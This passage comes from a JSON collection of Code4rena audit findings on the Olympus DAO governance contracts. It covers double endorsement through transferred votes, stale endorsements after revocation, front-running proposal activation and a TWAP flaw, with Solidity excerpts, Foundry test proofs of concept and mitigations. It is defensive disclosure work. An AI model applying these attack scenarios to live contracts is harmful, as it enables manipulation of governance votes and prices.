commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1252360367):**\n > Downgrading to M severity as this does not lead to direct loss of user funds, but does highlight an issue with current contracts. \n\n**[cccz (warden) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1255045809):**\n > Consider the following scenarios.\n> There are currently three users, A, B and C, in the system.\n> 1. voter_admin minted 100 VOTEs for each of these three users\n> 2. After a period of time, due to system upgrade or other reasons, the VOTEs of the users need to be revoked.\n> 3. voter_admin revokes the VOTEs of users A and B respectively, but user C uses this vulnerability to prevent his VOTE from being revoked.\n> 4. At this time, user C has all the VOTEs, and he can execute any proposal.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1255056253):**\n > Okay, at this point I still believe a Medium issue, voter_admin as a mitigation could reissue votes to User A and B. Additionally User C will eventually have to reclaim these votes in order to vote on the next proposal.  I am going to stick with Medium on this one. Appreciate the additional clarity. \n\n**[cccz (warden) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1255062224):**\n > @0xean - You are right, thanks for your attention.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is regarding the VoterRegistration contract, specifically the revokeVotesFrom function, which allows voter_admin to revoke the user's votes. However, there is a way for users to prevent their votes from being revoked by voter_admin. In the OlympusGovernance contract, the user can call the vote and reclaimVotes functions in one transaction. This allows the user to store their VOTES tokens in userVotesForProposal, and the revokeVotesFrom function cannot revoke the VOTES tokens recorded in userVotesForProposal. \n\nThe impact of this vulnerability is that the user can store their VOTES tokens in userVotesForProposal, and the revokeVotesFrom function cannot revoke the VOTES tokens recorded in userVotesForProposal. The proof of concept is provided in the github link and no tools were used. \n\nThe recommended mitigation step for this vulnerability is to consider allowing to call the reclaimVotes function to reclaim any user's vote, thus avoiding the user storing his VOTOS tokens in userVotesForProposal.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/308",
      "tags": [],
      "finders": [
        "cccz",
        "zzzitron"
      ]
    },
    {
      "id": "3214",
      "title": "[M-10] Voted votes cannot change after the user is issued new votes or the user's old votes are revoked during voting",
      "impact": "MEDIUM",
      "content": "_Submitted by rbserver, also found by &#95;&#95;141345&#95;&#95;, cccz, csanuragjain, GalloDaSballo, Guardian, Lambda, m9800, and zzzitron_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56><br>\n\nA user can call the following `vote` function to vote for a proposal. During voting, the voter admin can still call the `issueVotesTo` and `revokeVotesFrom` functions below to issue new votes or revoke old votes for the user, which also changes the votes' total supply during the overall voting. Because each user can only call `vote` once for a proposal due to the `userVotesForProposal[activeProposal.proposalId][msg.sender] > 0` conditional check, the old voted votes, resulted from the `vote` call by the user, will be used to compare against the new total supply of the votes, resulted from the `issueVotesTo` and `revokeVotesFrom` calls during the overall voting, when determining whether the proposal can be executed or not. Because of this inconsistency, the result on whether the proposal can be executed might not be reliable.\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262>\n\n```solidity\n    function vote(bool for_) external {\n        uint256 userVotes = VOTES.balanceOf(msg.sender);\n\n        if (activeProposal.proposalId == 0) {\n            revert NoActiveProposalDetected();\n        }\n\n        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {\n            revert UserAlreadyVoted();\n        }\n\n        if (for_) {\n            yesVotesForProposal[activeProposal.proposalId] += userVotes;\n        } else {\n            noVotesForProposal[activeProposal.proposalId] += userVotes;\n        }\n\n        userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;\n\n        VOTES.transferFrom(msg.sender, address(this), userVotes);\n\n        emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);\n    }\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48>\n\n```solidity\n    function issueVotesTo(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {\n        // Issue the votes in the VOTES module\n        VOTES.mintTo(wallet_, amount_);\n    }\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56>\n\n```solidity\n    function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {\n        // Revoke the votes in the VOTES module\n        VOTES.burnFrom(wallet_, amount_);\n    }\n```\n\n### Proof of Concept\n\nPlease add the following code in `src\\test\\policies\\Governance.t.sol`.\n\nFirst, please add the following code for `stdError`.\n\n```solidity\nimport {Test, stdError} from \"forge-std/Test.sol\";    // @audit import stdError for testing purpose\n```\n\nThen, please append the following tests. These tests will pass to demonstrate the described scenarios.\n\n```solidity\n    function testScenario_UserCannotVoteAgainWithNewlyMintedVotes() public {\n        _createActiveProposal();\n\n        // voter3 votes for the proposal\n        vm.prank(voter3);\n        governance.vote(true);\n\n        assertEq(governance.yesVotesForProposal(1), 300);\n        assertEq(governance.noVotesForProposal(1), 0);\n\n        assertEq(governance.userVotesForProposal(1, voter3), 300);\n        assertEq(VOTES.balanceOf(voter3), 0);\n        assertEq(VOTES.balanceOf(address(governance)), 300);\n\n        // to simulate calling VoterRegistration.issueVotesTo that mints votes to voter3, VOTES.mintTo is called by godmode here\n        vm.prank(godmode);\n        VOTES.mintTo(voter3, 500);\n        assertEq(VOTES.balanceOf(voter3), 500);\n\n        // calling vote function again by voter3 reverts, which means that voter3 cannot additionally vote with the 500 newly minted votes\n        vm.expectRevert(UserAlreadyVoted.selector);\n        vm.prank(voter3);\n        governance.vote(true);\n    }\n```\n\n```solidity\n    function testScenario_RevokeVotesAfterUserFinishsOwnVoting() public {\n        _createActiveProposal();\n\n        // voter3 votes for the proposal\n        vm.prank(voter3);\n        governance.vote(true);\n\n        assertEq(governance.yesVotesForProposal(1), 300);\n        assertEq(governance.noVotesForProposal(1), 0);\n\n        assertEq(governance.userVotesForProposal(1, voter3), 300);\n        assertEq(VOTES.balanceOf(voter3), 0);\n        assertEq(VOTES.balanceOf(address(governance)), 300);\n\n        // To simulate calling VoterRegistration.revokeVotesFrom that burns voter3's votes, VOTES.burnFrom is called by godmode here.\n        // However, calling VOTES.burnFrom will revert due to arithmetic underflow.\n        vm.prank(godmode);\n        vm.expectRevert(stdError.arithmeticError);\n        VOTES.burnFrom(voter3, 300);\n\n        // the proposal is still voted with voter3's previous votes afterwards\n        assertEq(governance.userVotesForProposal(1, voter3), 300);\n        assertEq(VOTES.balanceOf(voter3), 0);\n        assertEq(VOTES.balanceOf(address(governance)), 300);\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nWhen `issueVotesTo` and `revokeVotesFrom` are called during voting, the corresponding votes need to be added to or removed from the proposal's voted votes for the user. Alternatively, `issueVotesTo` and `revokeVotesFrom` can be disabled when an active proposal exists.\n\n**[fullyallocated (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/275#issuecomment-1236238446):**\n > This is the best written answer. \n>\n > Originally votes were locked so that users cannot constantly change their vote to manipulate the outcome but the warden makes a good point about how the quorum thresholds can be changed and the affects on how consensus is calculated.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the inconsistency that exists in the vote function of the Governance.sol file in the code-423n4/2022-08-olympus repository on GitHub. The vote function allows a user to cast a vote for a proposal. During the voting process, the voter admin can still call the issueVotesTo and revokeVotesFrom functions to issue new votes or revoke old votes for the user, which also changes the total supply of votes during the overall voting. \n\nThe inconsistency lies in the fact that each user can only call vote once for a proposal due to the userVotesForProposal[activeProposal.proposalId][msg.sender] > 0 conditional check. This means that the old voted votes, resulting from the vote call by the user, will be used to compare against the new total supply of votes, resulting from the issueVotesTo and revokeVotesFrom calls during the overall voting, when determining whether the proposal can be executed or not. This inconsistency can lead to unreliable results on whether the proposal can be executed or not.\n\nThe Proof of Concept section provides code for the stdError and tests to demonstrate the described scenarios. The Tools Used section mentions VSCode as the tool used.\n\nThe Recommended Mitigation Steps suggest that when issueVotesTo and revokeVotesFrom are called during voting, the corresponding votes need to be added to or removed from the proposal's voted votes for the user. Alternatively, issueVotesTo and revokeVotesFrom can be disabled when an active proposal exists.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/275",
      "tags": [],
      "finders": [
        "csanuragjain",
        "__141345__",
        "rbserver",
        "Guardian",
        "cccz",
        "GalloDaSballo",
        "Lambda",
        "m9800",
        "zzzitron"
      ]
    },
    {
      "id": "3213",
      "title": "[M-09] `activateProposal()` need time delay",
      "impact": "MEDIUM",
      "content": "_Submitted by &#95;&#95;141345&#95;&#95;, also found by 0x1f8b, Trust, V&#95;B, and zzzitron_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L205-L262><br>\n\nThere is no time lock or delay when activating a proposal, the previous one could be replaced immediately. In `vote()` call, a user might want to vote for the previous proposal, but if the `vote()` call and the `activateProposal()` is very close or even in the same block, it is quite possible that the user actually voted for another proposal without much knowledge of. A worse case is some malicious user watching the mempool, and front run a big vote favor/against the `activeProposal`, effectively influence the voting result.\n\nThese situations are not what the governance intends to deliver, and might also affect the results of 2 proposals.\n\n### Proof of Concept\n\n`activateProposal()` can take effect right away, replacing the `activeProposal`. And `vote()` does not specify which `proposalId` to vote for, but the `activeProposal` could be different from last second.\n\nsrc/policies/Governance.sol\n\n```solidity\n    function activateProposal(uint256 proposalId_) external {\n        ProposalMetadata memory proposal = getProposalMetadata[proposalId_];\n\n        if (msg.sender != proposal.submitter) {\n            revert NotAuthorizedToActivateProposal();\n        }\n\n        if (block.timestamp > proposal.submissionTimestamp + ACTIVATION_DEADLINE) {\n            revert SubmittedProposalHasExpired();\n        }\n\n        if (\n            (totalEndorsementsForProposal[proposalId_] * 100) <\n            VOTES.totalSupply() * ENDORSEMENT_THRESHOLD\n        ) {\n            revert NotEnoughEndorsementsToActivateProposal();\n        }\n\n        if (proposalHasBeenActivated[proposalId_] == true) {\n            revert ProposalAlreadyActivated();\n        }\n\n        if (block.timestamp < activeProposal.activationTimestamp + GRACE_PERIOD) {\n            revert ActiveProposalNotExpired();\n        }\n\n        activeProposal = ActivatedProposal(proposalId_, block.timestamp);\n\n        proposalHasBeenActivated[proposalId_] = true;\n\n        emit ProposalActivated(proposalId_, block.timestamp);\n    }\n\n    function vote(bool for_) external {\n        uint256 userVotes = VOTES.balanceOf(msg.sender);\n\n        if (activeProposal.proposalId == 0) {\n            revert NoActiveProposalDetected();\n        }\n\n        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {\n            revert UserAlreadyVoted();\n        }\n\n        if (for_) {\n            yesVotesForProposal[activeProposal.proposalId] += userVotes;\n        } else {\n            noVotesForProposal[activeProposal.proposalId] += userVotes;\n        }\n\n        userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;\n\n        VOTES.transferFrom(msg.sender, address(this), userVotes);\n\n        emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);\n    }\n\n```\n\n### Recommended Mitigation Steps\n\nAdd time delay when activating a proposal, so that users can be aware of that and vote for the current one within the time window.\n\n**[fullyallocated (Olympus) disputed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/273#issuecomment-1234872386):**\n > This is a pretty unique edge case, I can acknowledge as QA.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/273#issuecomment-1249571276):**\n > I actually don't think its that unique in the case of on chain voting. Imagine a scenario where a user submits a vote with low gas amounts and it is not mined for days later and then the active proposal has changed.  I am not sure why the `vote` function wouldn't take in the intended proposal ID. \n> \n> I am going to leave as medium severity as I do think this impacts the intended functionality of the protocol, but am willing to hear more from the sponsor on why they disagree.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the 'Governance.sol' code of the '2022-08-olympus' project on Github. The vulnerability is that there is no time delay when activating a proposal, meaning the previous one could be replaced immediately. This could lead to a situation where a user might want to vote for the previous proposal, but if the vote call and the activateProposal call are very close or even in the same block, it is quite possible that the user actually voted for another proposal without much knowledge of. A malicious user could even front run a big vote, influencing the voting result. Manual analysis was used to detect this vulnerability. The recommended mitigation step is to add a time delay when activating a proposal, so that users can be aware of that and vote for the current one within the time window.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/273",
      "tags": [
        "Vote"
      ],
      "finders": [
        "Trust",
        "__141345__",
        "zzzitron",
        "0x1f8b",
        "V_B"
      ]
    },
    {
      "id": "3212",
      "title": "[M-08] \"TWAP\" used is an observation-weighted-average-price, not a time-weighted one",
      "impact": "MEDIUM",
      "content": "_Submitted by IllIllI_\n\nWhile users are incentivized to call the heartbeat, the incentive may be removed later, or it may be more profitable to use old prices, so users may not call the heartbeat during unfavorable prices, leading to the TWAP price being incorrect, and users getting the wrong price for their assets.\n\nA similar case of an incomplete TWAP algorithm was found to be of [Medium](https://github.com/code-423n4/2022-06-nibbl-findings/issues/191) risk.\n\n### Proof of Concept\n\nA TWAP is a Time-Weighted average price, but the algorithm below does not take into account the time between observations:\n\n```solidity\nFile: /src/modules/PRICE.sol   #1\n\n134          // Calculate new moving average\n135          if (currentPrice > earliestPrice) {\n136              _movingAverage += (currentPrice - earliestPrice) / numObs;\n137          } else {\n138              _movingAverage -= (earliestPrice - currentPrice) / numObs;\n139          }\n140  \n141          // Push new observation into storage and store timestamp taken at\n142          observations[nextObsIndex] = currentPrice;\n143          lastObservationTime = uint48(block.timestamp);\n144:         nextObsIndex = (nextObsIndex + 1) % numObs;\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L134-L144>\n\nWhile the `Heart` policy enforces an upper bound on how frequently updates are added to the average, there is no guarantee that users call `beat()` in a timely manner:\n\n```solidity\nFile: /src/policies/Heart.sol   #2\n\n92       function beat() external nonReentrant {\n93           if (!active) revert Heart_BeatStopped();\n94:          if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle();\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92-L94>\n\nThe incentive may be set to too low an amount:\n\n```solidity\nFile: /src/policies/Heart.sol   #3\n\n140      function setRewardTokenAndAmount(ERC20 token_, uint256 reward_)\n141          external\n142          onlyRole(\"heart_admin\")\n143      {\n144          rewardToken = token_;\n145          reward = reward_;\n146          emit RewardUpdated(token_, reward_);\n147:     }\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L140-L147>\n\nOr users may find it more profitable to skip a particular update, or front-run an unfavorable update, with a transaction that trades assets at the old price\n\n### Recommended Mitigation Steps\n\nAlways call an internal version of `beat()` that doesn't revert, in functions that swap user assets. The code should also track the timestamps of when each `beat()` is called, and include the amount of time that has passed since the last beat, in the TWAP calculation\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/267#issuecomment-1241043919):**\n > The referenced issue is a bit different than our use case since we will be using a much longer duration moving average. The goal is to get an approximate moving average over a certain period of time (e.g. 120 days) vs. an exact number since, as you say, the time of each observation cannot be guaranteed to be at a specific time. We believe that using a long duration with a sufficient number of observations will make this value close enough to the true value it is approximating, and prevents actors from manipulating the value by waiting to provide a specific value (1 out of ~360 obs doesn't move the needle). The use of the \"TWAP\" term may be semantically inaccurate.\n> \n> As for not guaranteeing that the update will be called or issues with several observations close to each other, see comments on [#405](https://github.com/code-423n4/2022-08-olympus-findings/issues/405) and [#79](https://github.com/code-423n4/2022-08-olympus-findings/issues/79).\n> \n> The mitigations suggested do not seem to provide a solution that improves the system. Calling `beat()` on user actions would not have the observations roughly evenly spaced. Tracking timestamps is possible, but I don't see how it improves the data.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/267#issuecomment-1251044977):**\n > @Oighty - I think the warden is suggesting that the call to beat() in the user actions would do more to ensure that the \"TWAP\" stays up to date.  If the call isn't past the correct period, it would just return and make no change (costing some amount of gas, ofc).\n> \n> I do think it may be worth considering, that way no user action can take place without the TWAP being as up to date as possible and no additional calls to the contract may be necessary if users are interacting with the contract frequently enough. \n> \n> While this is related to [#79](https://github.com/code-423n4/2022-08-olympus-findings/issues/79) - I think the points raised here and the mitigation is sufficiently different to warrant this issue to stand alone.  \n\n**[Oighty (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/267#issuecomment-1255235303):**\n > That's a fair point. One issue with calling `beat` on user actions, e.g. `Operator.swap`, is that it would update the wall price that the user is swapping at. Therefore, the call could fail due to the slippage check. This could be confusing behavior and may have unintended consequences of DOS'ing the system. Additionally, the gas cost of `beat` is highly variable (sometimes up to 600k gas when opening a bond market) and would cause some users to unexpectedly pay a lot more gas for a swap.\n> \n> I'll discuss with the team, but I don't think the pros exceed the cons.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the PRICE.sol and Heart.sol smart contracts. The vulnerability is related to the Time-Weighted Average Price (TWAP) algorithm, which does not take into account the time between observations. This could lead to users getting the wrong price for their assets. The issue was found using code inspection and is of Medium risk. \n\nThe recommended mitigation steps are to always call an internal version of `beat()` that doesn't revert, in functions that swap user assets. Additionally, the code should track the timestamps of when each `beat()` is called, and include the amount of time that has passed since the last beat, in the TWAP calculation. This will ensure that users get the correct price for their assets.",
      "quality_score": 3,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/267",
      "tags": [
        "TWAP"
      ],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "3211",
      "title": "[M-07] Endorsed votes by a user do not decrease after the user's votes are revoked",
      "impact": "MEDIUM",
      "content": "_Submitted by rbserver_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201>\n\nThe voter admin can call the following `revokeVotesFrom` function to revoke a user's votes, which also decreases the total supply of the votes, after the user endorses a proposal through calling the `endorseProposal` function below. Because `endorseProposal` can be called multiple times, the user has the incentive to call it for endorsing the proposal again with the new votes minted by the [`issueVotesTo`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48) function. However, after the user's votes are revoked, the user has no incentive to call `endorseProposal` again. Hence, the endorsed votes by the user for the proposal does not decrease after the user's votes are revoked. When determining whether the proposal can be activated or not, its old endorsed votes, which is not decreased, are compared against the new total supply of the votes, which is decreased because of the `revokeVotesFrom` call. As a result, the proposal is unreliably more likely to satisfy the condition for being activated.\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56>\n\n```solidity\n    function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {\n        // Revoke the votes in the VOTES module\n        VOTES.burnFrom(wallet_, amount_);\n    }\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201>\n\n```solidity\n    function endorseProposal(uint256 proposalId_) external {\n        uint256 userVotes = VOTES.balanceOf(msg.sender);\n\n        if (proposalId_ == 0) {\n            revert CannotEndorseNullProposal();\n        }\n\n        Instruction[] memory instructions = INSTR.getInstructions(proposalId_);\n        if (instructions.length == 0) {\n            revert CannotEndorseInvalidProposal();\n        }\n\n        // undo any previous endorsement the user made on these instructions\n        uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender];\n        totalEndorsementsForProposal[proposalId_] -= previousEndorsement;\n\n        // reapply user endorsements with most up-to-date votes\n        userEndorsementsForProposal[proposalId_][msg.sender] = userVotes;\n        totalEndorsementsForProposal[proposalId_] += userVotes;\n\n        emit ProposalEndorsed(proposalId_, msg.sender, userVotes);\n    }\n```\n\n### Proof of Concept\n\nPlease append the following test in `src\\test\\policies\\Governance.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n    function testScenario_EndorsedVotesDoNotDecreaseAfterVotesAreRevoked() public {\n        _submitProposal();\n\n        // voter3 endorse the proposal\n        vm.prank(voter3);\n        governance.endorseProposal(1);\n\n        assertEq(governance.userEndorsementsForProposal(1, voter3), 300);\n        assertEq(governance.totalEndorsementsForProposal(1), 300);\n\n        // to simulate calling VoterRegistration.revokeVotesFrom that burns voter3's votes, VOTES.burnFrom is called by godmode here\n        vm.prank(godmode);\n        VOTES.burnFrom(voter3, 300);\n\n        // at this moment, voter3 has 0 votes\n        assertEq(VOTES.balanceOf(voter3), 0);\n\n        // however, the proposal is still endorsed with voter3's previous votes\n        assertEq(governance.userEndorsementsForProposal(1, voter3), 300);\n        assertEq(governance.totalEndorsementsForProposal(1), 300);\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nWhen `revokeVotesFrom` is called during the time for endorsement, the corresponding votes that are previously endorsed for a proposal and are now revoked should be removed from the proposal's endorsed votes for the user. This ensures that the endorsed votes and the votes' total supply after the revocation are in sync for the proposal.\n\n**[fullyallocated (Olympus) acknowledged and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/257#issuecomment-1235877095):**\n > This is true, and I appreciate the throughness of the explanationâ€”it's hard to adjust endorsements based on the user's balance because there's no events/callbacks in solidity. We plan to use a staking vault where tokens are transfer locked and there's a warmup period + cooldown period to mitigate this issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the vulnerability in the code of the 2022-08-olympus project, which is hosted on Github. The vulnerability is that when the voter admin calls the `revokeVotesFrom` function to revoke a user's votes, the total supply of the votes decreases, but the endorsed votes for the proposal do not decrease. This means that the proposal is more likely to satisfy the condition for being activated. The tools used to identify this vulnerability were VSCode.\n\nThe recommended mitigation steps for this vulnerability are to ensure that when `revokeVotesFrom` is called during the time for endorsement, the corresponding votes that are previously endorsed for a proposal and are now revoked should be removed from the proposal's endorsed votes for the user. This will ensure that the endorsed votes and the votes' total supply after the revocation are in sync for the proposal.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/257",
      "tags": [],
      "finders": [
        "rbserver"
      ]
    },
    {
      "id": "3210",
      "title": "[M-06] After endorsing a proposal, user can transfer votes to another user for endorsing the same proposal again",
      "impact": "MEDIUM",
      "content": "_Submitted by rbserver, also found by 0x1f8b, Bahurum, csanuragjain, and yixxas_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L9-L11><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L205-L236>\n\nThe following comment indicates that the `OlympusVotes` contract is a stub for `gOHM`. Checking the `gOHM` contract at <https://etherscan.io/token/0x0ab87046fBb341D058F17CBC4c1133F25a20a52f#code>, the `transfer` and `transferFrom` functions are available.\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L9-L11>\n\n```solidity\n/// @notice Votes module is the ERC20 token that represents voting power in the network.\n/// @dev    This is currently a substitute module that stubs gOHM.\ncontract OlympusVotes is Module, ERC20 {\n```\n\nMoreover, the [documentation](https://hackmd.io/iWgqYLFwShGUDBF4zh397w#3-Vote-Redemption) states that the vote redemption mechanism \"exists to deter malicious behavior by ensuring users cannot transfer their voting tokens until after the proposal has been resolved\", which also indicates that the voting tokens are meant to be transferrable between users.\n\nWhen the voting tokens are transferrable, one user can first use her or his votes to call the following `endorseProposal` function to endorse a proposal and then transfer these votes to another user. The other user can use these votes to endorse the same proposal again afterwards. Because of the double-endorsement, the `(totalEndorsementsForProposal[proposalId_] * 100) < VOTES.totalSupply() * ENDORSEMENT_THRESHOLD` condition can become true so the proposal can be activated by calling the `activateProposal` function below. However, the proposal should only be endorsed with these same votes once and should not be able to be activated if it could not satisify `(totalEndorsementsForProposal[proposalId_] * 100) < VOTES.totalSupply() * ENDORSEMENT_THRESHOLD` with these votes being used once.\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L180-L201>\n\n```solidity\n    function endorseProposal(uint256 proposalId_) external {\n        uint256 userVotes = VOTES.balanceOf(msg.sender);\n\n        if (proposalId_ == 0) {\n            revert CannotEndorseNullProposal();\n        }\n\n        Instruction[] memory instructions = INSTR.getInstructions(proposalId_);\n        if (instructions.length == 0) {\n            revert CannotEndorseInvalidProposal();\n        }\n\n        // undo any previous endorsement the user made on these instructions\n        uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender];\n        totalEndorsementsForProposal[proposalId_] -= previousEndorsement;\n\n        // reapply user endorsements with most up-to-date votes\n        userEndorsementsForProposal[proposalId_][msg.sender] = userVotes;\n        totalEndorsementsForProposal[proposalId_] += userVotes;\n\n        emit ProposalEndorsed(proposalId_, msg.sender, userVotes);\n    }\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L205-L236>\n\n```solidity\n    function activateProposal(uint256 proposalId_) external {\n        ProposalMetadata memory proposal = getProposalMetadata[proposalId_];\n\n        if (msg.sender != proposal.submitter) {\n            revert NotAuthorizedToActivateProposal();\n        }\n\n        if (block.timestamp > proposal.submissionTimestamp + ACTIVATION_DEADLINE) {\n            revert SubmittedProposalHasExpired();\n        }\n\n        if (\n            (totalEndorsementsForProposal[proposalId_] * 100) <\n            VOTES.totalSupply() * ENDORSEMENT_THRESHOLD\n        ) {\n            revert NotEnoughEndorsementsToActivateProposal();\n        }\n\n        if (proposalHasBeenActivated[proposalId_] == true) {\n            revert ProposalAlreadyActivated();\n        }\n\n        if (block.timestamp < activeProposal.activationTimestamp + GRACE_PERIOD) {\n            revert ActiveProposalNotExpired();\n        }\n\n        activeProposal = ActivatedProposal(proposalId_, block.timestamp);\n\n        proposalHasBeenActivated[proposalId_] = true;\n\n        emit ProposalActivated(proposalId_, block.timestamp);\n    }\n```\n\n### Proof of Concept\n\nPlease append the following test in `src\\test\\policies\\Governance.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n    function testScenario_UserEndorsesAfterReceivingTransferredVotes() public {\n        _submitProposal();\n\n        vm.prank(voter2);\n        governance.endorseProposal(1);\n\n        // to simulate calling gOHM's transfer function by voter2 for sending votes to voter0, VOTES.transferFrom is called by governance here\n        vm.prank(address(governance));\n        VOTES.transferFrom(voter2, voter0, 200);\n\n        // voter0 uses the votes previously owned by voter2 to endorse the proposal\n        vm.prank(voter0);\n        governance.endorseProposal(1);\n\n        // the proposal is endorsed with 400 votes but only the 200 votes originally owned by voter2 are used\n        assertEq(governance.userEndorsementsForProposal(1, voter0), 200);\n        assertEq(governance.userEndorsementsForProposal(1, voter2), 200);\n        assertEq(governance.totalEndorsementsForProposal(1), 400);\n\n        // At this moment, the proposal can be activated successfully.\n        // However, if it is endorsed with only 200 votes, it cannot satisfy ENDORSEMENT_THRESHOLD and cannot be activated.\n        vm.expectEmit(true, true, true, true);\n        emit ProposalActivated(1, block.timestamp);\n\n        vm.prank(voter1);\n        governance.activateProposal(1);\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nWhen calling `endorseProposal`, the user's votes can be locked by transferring these votes to the governance so the user cannot transfer these anymore to another user after the endorsement. An additional function can be added for reclaiming the endorsed votes back to the user and reducing the proposal's endorsed votes accordingly before the proposal is activated. After the proposal is activated, the endorsed votes should be counted as the voted votes.\n\n**[fullyallocated (Olympus) acknowledged and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/239#issuecomment-1235877496):**\n > Taken from another issue:\n> \n> >This is true, and I appreciate the throughness of the explanationâ€”it's hard to adjust endorsements based on the user's balance because there's no events/callbacks in solidity. We plan to use a staking vault where tokens are transfer locked and there's a warmup period + cooldown period to mitigate this issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `OlympusVotes` contract, which is a substitute module that stubs the `gOHM` contract. This vulnerability allows users to double-endorse a proposal, which can result in the proposal being activated even though it would not have been able to meet the endorsement threshold with the votes being used once.\n\nThe recommended mitigation steps are to lock the user's votes when they call the `endorseProposal` function by transferring these votes to the governance, and adding an additional function for reclaiming the endorsed votes back to the user and reducing the proposal's endorsed votes accordingly before the proposal is activated. After the proposal is activated, the endorsed votes should be counted as the voted votes.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/239",
      "tags": [],
      "finders": [
        "csanuragjain",
        "Bahurum",
        "yixxas",
        "rbserver",
